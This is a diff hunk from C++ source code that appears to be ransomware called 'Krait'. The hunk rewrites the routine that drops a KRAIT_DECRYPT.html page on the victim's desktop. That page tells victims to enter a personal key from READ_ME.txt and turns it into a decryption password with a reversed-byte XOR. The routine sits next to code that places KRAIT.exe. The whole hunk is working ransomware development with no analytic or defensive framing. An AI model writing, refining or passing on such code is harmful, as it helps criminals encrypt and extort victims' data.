@@ -215,51 +215,42 @@ void CreateDesktopFiles(const string& personalKey) {
     string html = d + "\\KRAIT_DECRYPT.html";
     ofstream h(html);
     if (h) {
-        h << R"(
-<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Krait Decrypt</title>
-<style>
-body { background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.container { background: #1a1a1a; padding: 40px; border-radius: 8px; border: 1px solid #333; max-width: 500px; text-align: center; }
-h1 { color: #ff3333; font-size: 28px; margin-top: 0; }
-p { color: #aaa; line-height: 1.6; font-size: 14px; }
-input { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 4px; font-size: 16px; margin: 20px 0; box-sizing: border-box; }
-input:focus { outline: none; border-color: #ff3333; }
-button { background: #ff3333; color: #fff; border: none; padding: 14px 40px; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.3s; }
-button:hover { background: #cc0000; }
-#result { margin-top: 20px; padding: 10px; background: #0a0a0a; border-radius: 4px; font-family: monospace; word-break: break-all; display: none; }
-</style>
-</head>
-<body>
-<div class="container">
-<h1>KRAIT DECRYPT</h1>
-<p>Enter your personal key from READ_ME.txt to generate decryption password:</p>
-<input type="text" id="keyInput" placeholder="XXXX-XXXX-XXXX-XXXX">
-<button onclick="decrypt()">DECRYPT</button>
-<div id="result"></div>
-</div>
-<script>
-function decrypt() {
-    var key = document.getElementById('keyInput').value.trim();
-    if (key.length < 16) { alert('Invalid key format'); return; }
-    var clean = key.replace(/-/g, '');
-    var bytes = [];
-    for (var i = 0; i < clean.length; i += 2) {
-        bytes.push(parseInt(clean.substr(i, 2), 16));
-    }
-    var result = '';
-    for (var i = bytes.length - 1; i >= 0; i--) {
-        var val = bytes[i] ^ 0xAA;
-        result += String.fromCharCode(val);
-    }
-    document.getElementById('result').style.display = 'block';
-    document.getElementById('result').textContent = 'Password: ' + result;
-}
-</script>
-</body>
-</html>
-)";
+        h << "<!DOCTYPE html>\n";
+        h << "<html>\n<head><meta charset=\"UTF-8\"><title>Krait Decrypt</title>\n";
+        h << "<style>\n";
+        h << "body { background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }\n";
+        h << ".container { background: #1a1a1a; padding: 40px; border-radius: 8px; border: 1px solid #333; max-width: 500px; text-align: center; }\n";
+        h << "h1 { color: #ff3333; font-size: 28px; margin-top: 0; }\n";
+        h << "p { color: #aaa; line-height: 1.6; font-size: 14px; }\n";
+        h << "input { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 4px; font-size: 16px; margin: 20px 0; box-sizing: border-box; }\n";
+        h << "input:focus { outline: none; border-color: #ff3333; }\n";
+        h << "button { background: #ff3333; color: #fff; border: none; padding: 14px 40px; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.3s; }\n";
+        h << "button:hover { background: #cc0000; }\n";
+        h << "#result { margin-top: 20px; padding: 10px; background: #0a0a0a; border-radius: 4px; font-family: monospace; word-break: break-all; display: none; }\n";
+        h << "</style>\n</head>\n<body>\n";
+        h << "<div class=\"container\">\n";
+        h << "<h1>KRAIT DECRYPT</h1>\n";
+        h << "<p>Enter your personal key from READ_ME.txt to generate decryption password:</p>\n";
+        h << "<input type=\"text\" id=\"keyInput\" placeholder=\"XXXX-XXXX-XXXX-XXXX\">\n";
+        h << "<button onclick=\"decrypt()\">DECRYPT</button>\n";
+        h << "<div id=\"result\"></div>\n</div>\n";
+        h << "<script>\n";
+        h << "function decrypt() {\n";
+        h << "    var key = document.getElementById('keyInput').value.trim();\n";
+        h << "    if (key.length < 16) { alert('Invalid key format'); return; }\n";
+        h << "    var clean = key.replace(/-/g, '');\n";
+        h << "    var bytes = [];\n";
+        h << "    for (var i = 0; i < clean.length; i += 2) {\n";
+        h << "        bytes.push(parseInt(clean.substr(i, 2), 16));\n";
+        h << "    }\n";
+        h << "    var result = '';\n";
+        h << "    for (var i = bytes.length - 1; i >= 0; i--) {\n";
+        h << "        var val = bytes[i] ^ 0xAA;\n";
+        h << "        result += String.fromCharCode(val);\n";
+        h << "    }\n";
+        h << "    document.getElementById('result').style.display = 'block';\n";
+        h << "    document.getElementById('result').textContent = 'Password: ' + result;\n";
+        h << "}\n</script>\n</body>\n</html>\n";
     }
 
     string exe = d + "\\KRAIT.exe";
